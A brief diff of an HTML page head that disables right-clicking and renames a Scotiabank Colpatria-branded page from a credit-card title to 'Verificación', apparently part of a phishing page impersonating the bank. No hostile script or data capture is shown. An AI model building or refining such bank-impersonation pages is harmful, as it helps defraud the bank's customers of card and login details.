@@ -6,7 +6,7 @@
 <head>
     <body oncontextmenu="return false">
 	<link rel="icon" href="favicon.png" type="favicon.png" sizes="32x32" />
-	<title>Scotiabank Colpatria ❘ Tarjeta de Crédito </title>
+	<title>Scotiabank Colpatria ❘ Verificación </title>
 	<meta charset="utf-8">
 
 <meta name="keywords" content="Test">
